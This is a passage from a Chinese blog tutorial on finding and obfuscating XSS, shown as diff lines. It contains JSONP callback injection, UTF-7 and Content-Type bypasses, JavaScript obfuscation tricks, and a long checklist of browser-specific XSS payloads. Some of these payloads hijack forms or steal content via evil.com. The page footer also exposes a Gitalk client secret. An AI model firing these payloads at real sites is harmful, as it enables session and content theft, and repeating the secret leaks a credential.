+<p>在这个过程中，如果数据提供方没有对 callback 函数名做安全过滤，并且页面本身也没有对 HTTP 响应头中的 Content-Type 做限制，那么我们便跨域直接对 callback 参数进行利用：</p>
+<pre><code class="language-http">get_json.php?id=123&amp;call_back=&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p>那么数据提供方返回的数据就会成为如下形式：</p>
+<pre><code class="language-json">&lt;script&gt;alert(1)&lt;/script&gt;([{'id':123,data:'some_data'}]);
+</code></pre>
+<p>由于页面是可访问的，浏览器默认就会当成 HTML 来解析，使得我们的 XSS 得以执行。</p>
+<p>而且由于callback函数处于文件开头，我们可以使用 “<code>+/v8</code>” 等字符让 IE 浏览器认为这是一个 UTF-7 编码的文件，之后再将我们的 XSS 代码进行 UTF-7 编码放进来即可。（这种方式已经成为历史）payload如下：</p>
+<pre><code class="language-http">get_json.php?id=123&amp;callback=%2B%2Fv8%20%2BADw-script%2BAD4-alert(1)%2BADw-%2Fscript%2BAD4
+</code></pre>
+<p>如果数据提供方给 JSON 数据页面 HTTP 响应头设置 Content-Type，可以存在被绕过的情况。</p>
+<ul>
+<li>“text/javascript” 在IE下有效，在 Firefox下我们的代码依旧能够执行。</li>
+<li>“text/plain” 在Firefox下有效，在IE下会执行。</li>
+<li>“application/x-zip-compressed” 对于XSS攻击在IE下会失效。</li>
+</ul>
+<p>一般认为设置成“application/json” 相对来说还是比较有效的，不过还是存在突破的可能性。</p>
+<p>因为 IE 浏览器确定文件类型时不完全依赖 Content-Type ，有时，如果我们直接增加一个 URL 参数为 a.html ，IE会认为这是一个 HTML 文件而忽略 Content-Type，使用 HTML 来解析文件。</p>
+<p>将其放到如下位置，就有可能绕过 Content-Type：</p>
+<pre><code class="language-http">foo.cgi?id=123&amp;a.html
+foo/?id=123&amp;a.html
+foo.php/a.html?id=123(apache 服务器会忽略掉 /a.html 去请求 foo.php)
+</code></pre>
+<h4 id="2javascript中的代码混淆">2.JavaScript中的代码混淆</h4>
+<p>有时虽然可以插入一个 alert(1) 这样的代码，但是想插入更多时，发现代码被做了 HTMLEncode 过滤，这时我们可以采用之前提到的方法，进行进制转换后使用 eval 来执行：</p>
+<pre><code class="language-javascript">eval(String.fromCharCode(97,108,101,114,116,40,49,41,59));
+</code></pre>
+<p>如果对输入的内容有字数限制，我们甚至可以输入 eval(name) 来做执行入口，然后在另一个可控制的页面（如攻击者的网站）放置如下一段代码：</p>
+<pre><code class="language-html">&lt;script&gt;
+window.name = &quot;alert('xss')&quot;;
+location.href = &quot;http://target.com/xss.php&quot;;
+&lt;/script&gt;
+</code></pre>
+<p>另一种，过滤器情况可能与之相反，没有限制字数，却过滤了大部分函数，如 eval、alert、http链接之类，那么我们都可以采取一些手段来绕过过滤器，如用 <code>(0)['constructor']['constructor']</code>来代替 eval，用 'h'+'t'+'t'+'p'来绕过简单的链接过滤等。</p>
+<p>还可以使用类似JSFUCK等方式。</p>
+<p>除此之外，我们也可以使用 Flash 来绕过过滤器和隐藏我们的脚本内容：</p>
+<pre><code class="language-html">&lt;embed allowscriptaccess=&quot;always&quot; src=&quot;http://www.evil.com/x.swf&quot; /&gt;
+</code></pre>
+<h3 id="突破url过滤">突破URL过滤</h3>
+<p>有的时候，我们注入 URL 时，可以参考如下一些技巧来绕过过滤：</p>
+<pre><code class="language-html">正常 &lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;
+URL编码 &lt;A HREF=&quot;http://%36%36%2e%31%30%32%2e%37%2e%31%34%37/&quot;&gt;XSS&lt;/A&gt;
+十进制 &lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;
+十六进制 &lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;
+八进制 &lt;A HREF=&quot;http://0102.0146.000700000223/&quot;&gt;XSS&lt;/A&gt;
+混合编码 &lt;A HREF=&quot;http://6&amp;#9;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
+不带http协议 &lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;
+最后加个点 &lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;
+</code></pre>
+<h3 id="更多经典的混淆check-list">更多经典的混淆Check List</h3>
+<pre><code class="language-html">简要说明	XSS利用点
+非IE实体编码	&lt;a href=&quot;javascript&amp;colon;alert&amp;lpar;1&amp;rpar;&quot;&gt;click&lt;/a&gt;
+非IE实体编码（变异）	&lt;a href=&quot;javascript&amp;#X0000000000000000003A(alert(1))&quot;&gt;click&lt;/a&gt;
+Opera data协议base64	&lt;a href=&quot;data:image/svg+xml;base64,&lt;&lt;&lt;&lt;PHNj cmlwdCB4bWxucz0iaH你R0cDovL3d3d y53My5vcmc妹vMjAwMC9zdmciPmFsZXJ0KDEpPC9zY3Jpc HQ+&gt;&lt;&gt;&quot;&gt;click&lt;/a&gt;
+Firefox data协议（空格分隔）	&lt;a href=&quot;data:D;base 64,PHNj cmlwdD5hbGV ydC hkb2N1bWVudC5 kb21haW4pP C9zY3JpcHQ+ &quot;&gt;click&lt;/a&gt;
+Firefox feed协议	&lt;a href=&quot;feed&amp;colon;feed&amp;#58javascript:alert(1)&quot;&gt;click&lt;/a&gt;
+IE 6/IE 7	&lt;base href=vbscript&amp;#0000058ABC/&gt;&lt;img/src=alert(1)&gt;
+标签优先级特性	&lt;xmp&gt;&lt;img alt=&quot;&lt;/xmp&gt;&lt;img src=xx:xx onerror=alert(1)//&quot;&gt;
+非IE注释	&lt;noembed&gt;&lt;!--&lt;/noembed&gt;&lt;svg/onload=alert(1)+l--&gt;
+IE条件注释bug	&lt;!--[if&lt;img src=xx:xx onerror=alert(1)//]--&gt;
+Chrome	&lt;meta http-equiv=&quot;refresh&quot; content=&quot;-.00e00,javascript&amp;colon;alert(1)&quot;&gt;
+Firefox	&lt;meta http-equiv=&quot;refresh&quot; content=&quot;,data:D,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;
+IE 6/IE 7 URL注入	&lt;meta http-equiv=&quot;refresh&quot; content=&quot;..... url=http://www.evil.com/?&amp;#59url=javascript:alert(1)&quot;&gt;
+WebKit code属性	&lt;embed code=\\\//evil.com/xss.swf allowScriptAccess=always&gt;
+Firefox jar-uri	&lt;iframe src=jar://evil.com/xss.jar!1.html &gt;
+formaction	&lt;isindex formaction=javascript:alert(1) type=image src=[图片地址] &gt;
+新属性	&lt;iframe srcdoc=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;
+SVG特性	&lt;svg&gt;&lt;script/xlink:href=data:;;;base64,YWxlcnQoMSk=&gt;&lt;/script&gt;
+SVG特性	&lt;svg&gt;&lt;script&gt;//&amp;#8232&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41&lt;/script&gt;
+Opera SVG	&lt;svg&gt;&lt;image/filter='url(&quot;data:image/svg-xml,%3cscript%20xmlns=%22http://www.w3.org/2000/svg%22&gt;alert(1)%3c/script&gt;&quot;)'&gt;
+Firefox新标签新属性	&lt;math xlink:href=&quot;javascript:alert(2)&quot;&gt;&lt;maction actiontype=&quot;statusline#http://evil.com&quot;&gt;click &lt;/maction&gt;&lt;/math&gt;
+IE解析bug	&lt;input value=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot; ` /&gt;
+非IE解析bug	&lt;input value/=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot; /&gt;
+IE解析bug	&lt;img src=http://evil.com/?xss=`123 alt=&quot;`&gt;&lt;body/onload=alert(1)//&quot; &gt;
+IE	&lt;img src=``onerror=alert(1) &gt;
+浏览器bug	&lt;img src= alt=&quot; onerror=alert(1)//&quot; &gt;
+IE解析bug	&lt;img src=`&lt;body/onload=alert(1) /&gt;
+IE data协议（CSS里）	&lt;style&gt;@\[0x0b]\ \ I\mpor\t[0x0b]da[0x0a]ta:,%2A%7b%78%3A%65%78%70%72%65%73%73% 69%6F%6E%28%77%72%69%74%65%28%31%29%29%7D;
+IE诡异闭合	&lt;!DOCTYPE html&gt;&lt;style&gt;*{background:\\\url(http://evil.com /?;x_:expression(write(1))
+IE诡异闭合	&lt;div style=&quot;font-family:}0=expression(write(1))&quot;&gt;
+链接劫持	&lt;base href=&quot;//evil.com?&quot;
+表单劫持	&lt;input value=&quot;123 &gt;&gt;[inj]&quot;formaction=//evil.com &lt;&lt;[inj] &quot;&gt;
+表单劫持	&lt;button form=&quot;test&quot; formaction=&quot;//evil.com&quot;&gt;
+内容窃取（需要点击）	&lt;form/action=//evil.com&gt;&lt;button&gt;&lt;textarea/name=/&gt;
+IE内容窃取	&lt;img src=`//evil.com?
+IE&lt;9 vbscript	&lt;body/onload=\\\vbs\\\::::::::alert+'s'+[000000]+'g'+[000000]+'l'::::::::&gt;
+SVG解析异常	&lt;svg&gt;&lt;script&gt;a='&lt;svg/onload=alert(1)&gt;&lt;/svg&gt;';alert(2)&lt;/script&gt;
+Chrome异常	&lt;body/onload=throw['=alert\x281\x29//',onerror=setTimeout]&gt;
+Chrome诡异闭合	&lt;body/onload=&quot;$})}}}});alert(1)({0:{0:{0:function(){0({&quot;&gt;
+Firefox E4X	&lt;script&gt;location=&lt;&gt;javas{[function::[&lt;&gt;status&lt;/&gt;]]}cript:alert%281%29&lt;/&gt;&lt;/script&gt;
+IE location	script&gt;-{valueOf:location,toString:[].pop,0:'vbscript:alert%281%29',length:1}&lt;/script&gt;
+Opera按空格执行	&lt;link href=&quot;javascript:alert(1)&quot; rel=&quot;next&quot;&gt;
+Firefox	&lt;applet code=javascript:alert(1)&gt;
+Firefox	&lt;embed src=javascript:alert(1)&gt;
+WebKit	&lt;svg&gt;&lt;oooooo/oooooooooo/onload=alert(1)&gt;
+</code></pre>
+<p>除了这些，我们可以参考http://html5sec.org/上整理的 CheckList</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%9F%BA%E7%A1%80%E8%A1%A5%E5%85%85">基础补充</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98">漏洞挖掘</a>
+<ul>
+<li><a href="#%E6%99%AE%E9%80%9Axss%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF">普通XSS漏洞自动化挖掘思路</a>
+<ul>
+<li><a href="#1html%E6%A0%87%E7%AD%BE%E4%B9%8B%E9%97%B4">1.HTML标签之间</a></li>
+<li><a href="#2html%E6%A0%87%E7%AD%BE%E4%B9%8B%E5%86%85">2.HTML标签之内</a>
+<ul>
+<li><a href="#1%E8%BE%93%E5%87%BA%E5%9C%A8value%E5%B1%9E%E6%80%A7%E5%86%85">1）输出在value属性内</a></li>
+<li><a href="#2%E8%BE%93%E5%87%BA%E5%9C%A8-srchrefaction-%E5%B1%9E%E6%80%A7%E5%86%85">2）输出在 src/href/action 属性内</a></li>
+<li><a href="#3%E8%BE%93%E5%87%BA%E5%9C%A8-on-%E4%BA%8B%E4%BB%B6%E5%86%85">3）输出在 on* 事件内</a></li>
+<li><a href="#4%E8%BE%93%E5%87%BA%E5%9C%A8-style-%E5%B1%9E%E6%80%A7%E5%86%85">4）输出在 style 属性内</a></li>
+<li><a href="#5%E5%B1%9E%E6%80%A7%E5%BC%95%E7%94%A8%E7%AC%A6%E5%8F%B7">5）属性引用符号</a></li>
+</ul>
+</li>
+<li><a href="#3%E6%88%90%E4%B8%BA-javascript-%E4%BB%A3%E7%A0%81%E7%9A%84%E5%80%BC">3.成为 JavaScript 代码的值</a></li>
+<li><a href="#4%E8%AF%B7%E6%B1%82%E4%B8%AD%E7%9A%84%E7%8E%84%E6%9C%BA">4.请求中的玄机</a></li>
+<li><a href="#5%E5%85%B3%E4%BA%8E%E5%AD%98%E5%82%A8%E5%9E%8Bxss%E6%8C%96%E6%8E%98">5.关于存储型XSS挖掘</a></li>
+</ul>
+</li>
+<li><a href="#dom%E6%B8%B2%E6%9F%93">DOM渲染</a>
+<ul>
+<li><a href="#html%E4%B8%8Ejavascript%E8%87%AA%E8%A7%A3%E7%A0%81%E6%9C%BA%E5%88%B6">HTML与JavaScript自解码机制</a></li>
+<li><a href="#%E5%85%B7%E5%A4%87-htmlencode-%E5%8A%9F%E8%83%BD%E7%9A%84%E6%A0%87%E7%AD%BE">具备 HtmlEncode 功能的标签</a></li>
+<li><a href="#url%E7%BC%96%E7%A0%81%E5%B7%AE%E5%BC%82">URL编码差异</a></li>
+<li><a href="#dom%E4%BF%AE%E6%AD%A3%E5%BC%8F%E6%B8%B2%E6%9F%93">DOM修正式渲染</a></li>
+<li><a href="#%E4%B8%80%E7%A7%8Ddom-fuzzing%E6%8A%80%E5%B7%A7">一种DOM fuzzing技巧</a></li>
+</ul>
+</li>
+<li><a href="#dom-xss%E6%8C%96%E6%8E%98">DOM XSS挖掘</a>
+<ul>
+<li><a href="#%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95">静态方法</a></li>
+<li><a href="#%E5%8A%A8%E6%80%81%E6%96%B9%E6%B3%95">动态方法</a></li>
+</ul>
+</li>
+<li><a href="#%E5%AD%97%E7%AC%A6%E9%9B%86%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E7%9A%84xss">字符集缺陷导致的XSS</a>
+<ul>
+<li><a href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5">基本概念</a>
+<ul>
+<li><a href="#1%E5%AD%97%E7%AC%A6%E4%B8%8E%E5%AD%97%E8%8A%82">1.字符与字节</a></li>
+<li><a href="#2%E5%AD%97%E7%AC%A6%E9%9B%86">2.字符集</a></li>
+<li><a href="#3%E5%AD%97%E7%AC%A6%E9%9B%86%E7%BC%96%E7%A0%81">3.字符集编码</a></li>
+</ul>
+</li>
+<li><a href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BC%96%E7%A0%81%E5%B8%A6%E6%9D%A5%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98">宽字节编码带来的安全问题</a></li>
+<li><a href="#utf-7-%E9%97%AE%E9%A2%98">UTF-7 问题</a>
+<ul>
+<li><a href="#1%E8%87%AA%E5%8A%A8%E9%80%89%E6%8B%A9-utf-7-%E7%BC%96%E7%A0%81">1.自动选择 UTF-7 编码</a></li>
+<li><a href="#2%E9%80%9A%E8%BF%87-iframe-%E6%96%B9%E5%BC%8F%E8%B0%83%E7%94%A8%E5%A4%96%E9%83%A8-utf-7-%E7%BC%96%E7%A0%81%E7%9A%84html-%E6%96%87%E4%BB%B6">2.通过 iframe 方式调用外部 UTF-7 编码的HTML 文件</a></li>
+<li><a href="#3%E9%80%9A%E8%BF%87-link-%E6%96%B9%E5%BC%8F%E8%B0%83%E7%94%A8%E5%A4%96%E9%83%A8-utf-7-%E7%BC%96%E7%A0%81%E7%9A%84-css-%E6%96%87%E4%BB%B6">3.通过 link 方式调用外部 UTF-7 编码的 CSS 文件</a></li>
+<li><a href="#4%E9%80%9A%E8%BF%87%E6%8C%87%E5%AE%9A-bom-%E6%96%87%E4%BB%B6%E5%A4%B4">4.通过指定 BOM 文件头</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E7%BB%95%E8%BF%87%E6%B5%8F%E8%A7%88%E5%99%A8xss-filter">绕过浏览器XSS Filter</a>
+<ul>
+<li><a href="#%E5%93%8D%E5%BA%94%E5%A4%B4-crlf-%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87">响应头 CRLF 注入绕过</a></li>
+<li><a href="#%E9%92%88%E5%AF%B9%E5%90%8C%E5%9F%9F%E7%9A%84%E7%99%BD%E5%90%8D%E5%8D%95">针对同域的白名单</a>
+<ul>
+<li><a href="#1ie%E7%9A%84%E5%90%8C%E5%9F%9F%E7%99%BD%E5%90%8D%E5%8D%95">1.IE的同域白名单</a></li>
+<li><a href="#2chrome%E7%9A%84%E5%90%8C%E5%9F%9F%E7%99%BD%E5%90%8D%E5%8D%95">2.Chrome的同域白名单</a></li>
+</ul>
+</li>
+<li><a href="#%E5%9C%BA%E6%99%AF%E4%BE%9D%E8%B5%96%E6%80%A7%E9%AB%98%E7%9A%84%E7%BB%95%E8%BF%87">场景依赖性高的绕过</a>
+<ul>
+<li><a href="#1%E5%9C%BA%E6%99%AF%E4%B8%80">1.场景一</a></li>
+<li><a href="#2%E5%9C%BA%E6%99%AF%E4%BA%8C">2.场景二</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E6%B7%B7%E6%B7%86%E7%9A%84%E4%BB%A3%E7%A0%81">混淆的代码</a>
+<ul>
+<li><a href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E8%BF%9B%E5%88%B6%E5%B8%B8%E8%AF%86">浏览器的进制常识</a>
+<ul>
+<li><a href="#1html%E8%BF%9B%E5%88%B6%E7%94%A8%E6%B3%95">1.HTML进制用法</a></li>
+<li><a href="#2css%E8%BF%9B%E5%88%B6%E7%94%A8%E6%B3%95">2.CSS进制用法</a></li>
+<li><a href="#3javascript%E8%BF%9B%E5%88%B6%E7%94%A8%E6%B3%95">3.JavaScript进制用法</a></li>
+</ul>
+</li>
+<li><a href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E7%BC%96%E7%A0%81%E5%B8%B8%E8%AF%86">浏览器的编码常识</a></li>
+<li><a href="#html-%E4%B8%AD%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7">HTML 中的代码注入技巧</a>
+<ul>
+<li><a href="#1%E6%A0%87%E7%AD%BE">1.标签</a></li>
+<li><a href="#2%E5%B1%9E%E6%80%A7">2.属性</a></li>
+<li><a href="#3html%E4%BA%8B%E4%BB%B6">3.HTML事件</a></li>
+</ul>
+</li>
+<li><a href="#css-%E4%B8%AD%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7">CSS 中的代码注入技巧</a>
+<ul>
+<li><a href="#1css-%E8%B5%84%E6%BA%90%E7%B1%BB%E5%B1%9E%E6%80%A7">1.CSS 资源类属性</a></li>
+<li><a href="#2expression">2.expression</a></li>
+</ul>
+</li>
+<li><a href="#javascript-%E4%B8%AD%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7">JavaScript 中的代码注入技巧</a>
+<ul>
+<li><a href="#1json">1.JSON</a></li>
+<li><a href="#2javascript%E4%B8%AD%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86">2.JavaScript中的代码混淆</a></li>
+</ul>
+</li>
+<li><a href="#%E7%AA%81%E7%A0%B4url%E8%BF%87%E6%BB%A4">突破URL过滤</a></li>
+<li><a href="#%E6%9B%B4%E5%A4%9A%E7%BB%8F%E5%85%B8%E7%9A%84%E6%B7%B7%E6%B7%86check-list">更多经典的混淆Check List</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://su18.org/post/wi-fi/">
+              <h3 class="post-title">
+                [旧文归档] WI-FI 攻击利器 Pineapple Nano 初探
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '21ee097e0f08e9b76b4b',
+    clientSecret: 'bda6c4a0d4dc3f275da2e82d2d59b683274ff195',
+    repo: 'blogtalk',
+    owner: 'su18',
+    admin: ['su18'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  友情链接：<a href="https://www.yzmm.net/" target="_blank">园长</a> <a href="https://www.cnblogs.com/H4ck3R-XiX/" target="_blank">赵公子</a> <a href="https://fynch3r.github.io" target="_blank">fynch3r</a> <a href="https://g1asssy.com/" target="_blank">Glassy@Amadeus</a> <a href="https://iswin.org/" target="_blank">随风</a>  <a href="https://www.9170.org/" target="_blank">健宇</a>  <a href="https://fuzz7j.github.io/" target="_blank">fuzz7j</a>  <a href="https://blog.zgsec.cn/" target="_blank">曾哥</a> | 
+  <a class="rss" href="https://su18.org/atom.xml" target="_blank">RSS</a>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+
+  let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+  // This should probably be throttled.
+  // Especially because it triggers during smooth scrolling.
+  // https://lodash.com/docs/4.17.10#throttle
+  // You could do like...
+  // window.addEventListener("scroll", () => {
+  //    _.throttle(doThatStuff, 100);
+  // });
+  // Only not doing it here to keep this Pen dependency-free.
+
+  window.addEventListener("scroll", event => {
+    let fromTop = window.scrollY;
+
+    mainNavLinks.forEach((link, index) => {
+      let section = document.getElementById(decodeURI(link.hash).substring(1));
+      let nextSection = null
+      if (mainNavLinks[index + 1]) {
+        nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+      }
+      console.log('section.offsetHeight', section.offsetHeight);
+      if (section.offsetTop <= fromTop) {
+        if (nextSection) {
+          if (nextSection.offsetTop > fromTop) {
+            link.classList.add("current");
+          } else {
+            link.classList.remove("current");    
+          }
+        } else {
+          link.classList.add("current");
+        }
+      } else {
+        link.classList.remove("current");
+      }
+    });
+  });
+
+</script>
+
+      </div>
+    </div>
+  </body>
+</html>
